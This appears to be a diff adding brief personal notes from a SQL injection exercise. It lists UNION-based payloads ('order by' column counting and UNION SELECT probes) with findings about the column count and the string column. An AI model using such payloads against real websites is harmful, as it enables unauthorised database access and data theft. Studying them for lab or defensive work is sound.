@@ -1,0 +1,12 @@
+
+
+
+
+' order by 1--
+-> 3 columns -> 1st column is not shown on the page.
+
+' UNION select NULL, 'KsZXy4', NULL--
+-> 2nd column of type string
+
+' UNION select 'a', NULL, NULL--'
+' UNION select NULL, 'a', NULL--
